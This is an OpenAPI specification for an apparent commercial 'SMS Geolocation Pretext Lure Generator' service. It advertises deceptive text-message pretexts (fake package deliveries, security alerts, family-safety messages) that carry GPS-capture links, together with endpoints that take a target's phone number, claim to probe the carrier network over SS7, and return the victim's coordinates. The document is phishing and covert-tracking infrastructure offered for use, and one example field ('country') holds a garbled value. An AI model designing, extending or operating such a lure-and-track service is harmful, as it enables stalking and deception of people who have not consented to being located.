openapi: 3.0.3
info:
  title: SMS Geolocation Pretext Lure Generator API
  description: High-converting SMS pretext templates (Package Delivery, Urgent Security, Family Safety, Courier Drop-off) with automated GPS capture links.
  version: 2.1.0
  contact:
    name: TrackPhoneNow Global Telecom Support
    url: https://trackphonenow.com
servers:
  - url: https://trackphonenow.com
    description: Production Global Telecom Gateway
paths:
  /api/create-track:
    post:
      summary: Initialize cellular geolocation tracking session
      description: Initiates SS7 / BTS carrier signaling probe for target mobile handset.
      requestBody:
        required: true
        content:
          application/json:
            schema:
              type: object
              required:
                - targetPhone
              properties:
                targetPhone:
                  type: string
                  example: "+14155550143"
                pretextType:
                  type: string
                  enum: [delivery, friend, emergency, custom]
                  default: delivery
      responses:
        '200':
          description: Tracking session successfully initiated
          content:
            application/json:
              schema:
                type: object
                properties:
                  success:
                    type: boolean
                    example: true
                  trackingId:
                    type: string
                    example: "trk_94821a8f"
                  trackingUrl:
                    type: string
                    example: "https://trackphonenow.com/t/trk_94821a8f"
  /api/geo-ip:
    get:
      summary: Resolve client IP geolocation & carrier ASN
      responses:
        '200':
          description: Resolved geolocation
          content:
            application/json:
              schema:
                type: object
                properties:
                  city:
                    type: string
                    example: "Chicago"
                  country:
                    type: string
                    example: "Multilingual (EN, FR, ES, DE, AR)"
                  lat:
                    type: number
                    example: 41.8781
                  lng:
                    type: number
                    example: -87.6298
